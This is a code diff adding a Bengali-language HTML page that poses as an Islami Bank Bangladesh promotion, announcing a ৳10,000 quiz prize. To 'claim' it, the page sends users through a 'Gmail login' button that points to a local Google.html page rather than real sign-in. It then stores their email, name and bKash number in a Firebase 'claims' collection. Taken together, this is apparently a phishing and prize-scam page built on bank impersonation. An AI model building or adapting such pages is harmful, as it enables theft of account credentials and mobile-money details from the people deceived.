@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="bn">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>রেজাল্ট — Islami Bank LMT</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    /* Google Login Button */
+    .google-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      padding: 16px;
+      background: #fff;
+      border: 2px solid #e0e0e0;
+      border-radius: 14px;
+      font-family: 'Hind Siliguri', sans-serif;
+      font-size: 17px;
+      font-weight: 600;
+      color: #333;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+      touch-action: manipulation;
+    }
+
+    .google-btn:hover {
+      border-color: #4285f4;
+      background: #f8f9ff;
+    }
+
+    .google-btn:active {
+      transform: scale(0.97);
+    }
+
+    .google-btn img {
+      width: 24px;
+      height: 24px;
+    }
+
+    /* Login prompt box */
+    .login-prompt {
+      background: #f0f4f8;
+      border: 2px dashed #c0cdd8;
+      border-radius: 14px;
+      padding: 24px 20px;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .login-prompt .lock-icon {
+      font-size: 40px;
+      margin-bottom: 10px;
+    }
+
+    .login-prompt h3 {
+      font-size: 18px;
+      font-weight: 700;
+      color: #1a1a2e;
+      margin-bottom: 6px;
+    }
+
+    .login-prompt p {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+
+    /* User info bar */
+    .user-bar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--primary-light);
+      border-radius: 12px;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+    }
+
+    .user-bar img {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: 2px solid var(--primary);
+    }
+
+    .user-bar .user-info {
+      flex: 1;
+    }
+
+    .user-bar .user-name {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--primary-dark);
+    }
+
+    .user-bar .user-email {
+      font-size: 12px;
+      color: var(--text-light);
+    }
+
+    .user-bar .verified {
+      font-size: 18px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="confetti-container" id="confetti"></div>
+
+  <header class="header">
+    <div class="bank-logo">
+      <img src="logo.png" alt="Islami Bank"
+        style="width:100%;height:100%;object-fit:contain;border-radius:10px;" />
+    </div>
+    <div class="bank-name">
+      <h1>Islami Bank LMT</h1>
+      <p>Bangladesh Limited</p>
+    </div>
+  </header>
+
+  <div class="container" style="padding-top: 24px;">
+    <div class="card">
+
+      <!-- ====== WIN SECTION ====== -->
+      <div id="result-win" style="display:none;">
+        <div class="result-icon">🎉</div>
+        <div class="result-title win">অভিনন্দন! আপনি জিতেছেন!</div>
+        <div class="result-sub">
+          সব ৫টি প্রশ্নের সঠিক উত্তর দিয়েছেন!<br />
+          পুরস্কার: <strong style="color:#1a6b3a; font-size:20px;">৳১০,০০০ টাকা</strong>
+        </div>
+
+        <div class="score-display">
+          <div class="score-num">৫/৫</div>
+          <div class="score-label">সঠিক উত্তর ✅</div>
+        </div>
+
+        <!-- STEP 1: Google Login (shown first) -->
+        <div id="login-step">
+          <div class="login-prompt">
+            <div class="lock-icon">🔐</div>
+            <h3>পুরস্কার ক্লেম করতে লগইন করুন</h3>
+            <p>আপনার Gmail দিয়ে লগইন করুন,<br />তারপর bKash বা Nagad নম্বর দিয়ে পুরস্কার ক্লেম করুন।</p>
+            <button class="google-btn" onclick="window.location.href='Google.html'" id="google-login-btn">
+              <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" />
+              Gmail দিয়ে লগইন করুন
+            </button>
+          </div>
+        </div>
+
+        <!-- STEP 2: bKash Claim (shown after login) -->
+        <div id="claim-step" style="display:none;">
+          <!-- User info bar -->
+          <div class="user-bar" id="user-bar">
+            <img id="user-photo" src="" alt="User" />
+            <div class="user-info">
+              <div class="user-name" id="user-name"></div>
+              <div class="user-email" id="user-email"></div>
+            </div>
+            <div class="verified">✅</div>
+          </div>
+
+          <!-- Claim Form -->
+          <div class="claim-section">
+            <h3>📱 bKash নম্বর দিন</h3>
+            <div class="input-group">
+              <label for="bkash-number">আপনার bKash নম্বর:</label>
+              <input type="tel" id="bkash-number" placeholder="01XXXXXXXXX" maxlength="11" inputmode="numeric"
+                pattern="[0-9]*" />
+            </div>
+            <button class="btn btn-gold" onclick="claimPrize()" id="claim-btn">
+              💰 ক্লেম করুন
+            </button>
+          </div>
+
+          <!-- Claim Success -->
+          <div class="claim-success" id="claim-success">
+            <div class="success-icon">✅</div>
+            <p>
+              ক্লেম সফল হয়েছে!<br />
+              <strong id="claimed-number"></strong> নম্বরে<br />
+              শীঘ্রই <strong>৳১০,০০০ টাকা</strong> পাঠানো হবে।<br />
+              ধন্যবাদ Islami Bank এর সাথে থাকার জন্য! 🙏
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====== LOSE SECTION ====== -->
+      <div id="result-lose" style="display:none;">
+        <div class="result-icon">😔</div>
+        <div class="result-title lose">দুঃখিত! আপনি জিতেননি।</div>
+        <div class="result-sub" id="lose-text"></div>
+        <div class="score-display" style="background: #ffebee;">
+          <div class="score-num" id="lose-score" style="color:#c62828;"></div>
+          <div class="score-label">সঠিক উত্তর</div>
+        </div>
+        <a href="index.html" class="btn btn-primary">🔄 আবার চেষ্টা করুন</a>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer">© 2026 Islami Bank Bangladesh Limited</div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+  <script>
+    // ============================================================
+    // ⚠️ আপনার Firebase Config এখানে বসান
+    // Firebase Console → Project Settings → Your apps → Web app
+    // ============================================================
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPtPwc_a6zx0V2U-2bnAAep1r38xcJkAw",
+      authDomain: "islami-bank-quiz.firebaseapp.com",
+      projectId: "islami-bank-quiz",
+      storageBucket: "islami-bank-quiz.firebasestorage.app",
+      messagingSenderId: "463779241704",
+      appId: "1:463779241704:web:1b67963755b0bc1f64735d",
+      measurementId: "G-THP0SSP2RT"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.firestore();
+
+    let currentUser = null;
+
+    // ============================================================
+    // SHOW RESULT
+    // ============================================================
+    const score = parseInt(sessionStorage.getItem('quiz_score') || '0');
+    const total = parseInt(sessionStorage.getItem('quiz_total') || '5');
+
+    if (score === total) {
+      document.getElementById('result-win').style.display = 'block';
+      launchConfetti();
+    } else {
+      document.getElementById('result-lose').style.display = 'block';
+      document.getElementById('lose-score').textContent = score + '/' + total;
+      document.getElementById('lose-text').innerHTML =
+        `আপনি ${total}টির মধ্যে <strong>${score}টি</strong> সঠিক উত্তর দিয়েছেন।<br/>
+         সব ৫টি সঠিক দিলেই ৳১০,০০০ টাকা পাবেন।`;
+    }
+
+    // ============================================================
+    // GOOGLE SIGN IN
+    // ============================================================
+    function signInWithGoogle() {
+      const btn = document.getElementById('google-login-btn');
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner" style="border-color:rgba(0,0,0,0.2);border-top-color:#4285f4;"></span> লগইন হচ্ছে...';
+
+      const provider = new firebase.auth.GoogleAuthProvider();
+      auth.signInWithPopup(provider)
+        .then((result) => {
+          currentUser = result.user;
+          onLoginSuccess(currentUser);
+        })
+        .catch((error) => {
+          btn.disabled = false;
+          btn.innerHTML = '<img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" style="width:24px;height:24px;" /> Gmail দিয়ে লগইন করুন';
+          alert('লগইন সমস্যা হয়েছে। আবার চেষ্টা করুন।\n' + error.message);
+        });
+    }
+
+    function onLoginSuccess(user) {
+      // Hide login step, show claim step
+      document.getElementById('login-step').style.display = 'none';
+      document.getElementById('claim-step').style.display = 'block';
+
+      // Show  verified
+      document.getElementById('user-name').textContent = user.displayName || ' verified';
+      document.getElementById('user-email').textContent = user.email;
+      if (user.photoURL) {
+        document.getElementById('user-photo').src = user.photoURL;
+      } else {
+        document.getElementById('user-photo').src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(user.displayName || 'U') + '&background=1a6b3a&color=fff';
+      }
+    }
+
+    // ============================================================
+    // CLAIM — saves Gmail + bKash number to Firebase
+    // ============================================================
+    async function claimPrize() {
+      const num = document.getElementById('bkash-number').value.trim();
+
+      if (!num || num.length < 11) {
+        alert('সঠিক bKash নম্বর দিন (১১ সংখ্যা)।');
+        return;
+      }
+      if (!/^01[3-9]\d{8}$/.test(num)) {
+        alert('সঠিক বাংলাদেশি মোবাইল নম্বর দিন।\nউদাহরণ: 01712345678');
+        return;
+      }
+
+      const btn = document.getElementById('claim-btn');
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span>জমা হচ্ছে...';
+
+      try {
+        await db.collection('claims').add({
+          bkashNumber: num,
+          gmail: currentUser ? currentUser.email : 'unknown',
+          userName: currentUser ? currentUser.displayName : 'unknown',
+          uid: currentUser ? currentUser.uid : null,
+          prize: 10000,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          status: 'pending'
+        });
+
+        // Success!
+        document.getElementById('claimed-number').textContent = num;
+        document.getElementById('claim-success').style.display = 'block';
+        document.getElementById('bkash-number').disabled = true;
+        document.getElementById('claim-section') && (document.querySelector('.claim-section').style.display = 'none');
+        btn.innerHTML = '✅ ক্লেম জমা হয়েছে!';
+        sessionStorage.clear();
+
+      } catch (error) {
+        console.error(error);
+        btn.disabled = false;
+        btn.innerHTML = '💰 ক্লেম করুন';
+        alert('সমস্যা হয়েছে! আবার চেষ্টা করুন।\n' + error.message);
+      }
+    }
+
+    // ============================================================
+    // CONFETTI
+    // ============================================================
+    function launchConfetti() {
+      const colors = ['#1a6b3a', '#c9a227', '#2da15a', '#ffd700', '#0f4a27', '#fff'];
+      const container = document.getElementById('confetti');
+      for (let i = 0; i < 70; i++) {
+        const piece = document.createElement('div');
+        piece.className = 'confetti-piece';
+        piece.style.left = Math.random() * 100 + '%';
+        piece.style.top = '-10px';
+        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
+        const size = Math.random() * 8 + 6;
+        piece.style.width = size + 'px';
+        piece.style.height = size + 'px';
+        piece.style.animationDuration = (Math.random() * 2.5 + 2) + 's';
+        piece.style.animationDelay = Math.random() * 2.5 + 's';
+        container.appendChild(piece);
+      }
+    }
+  </script>
+</body>
+
+</html>
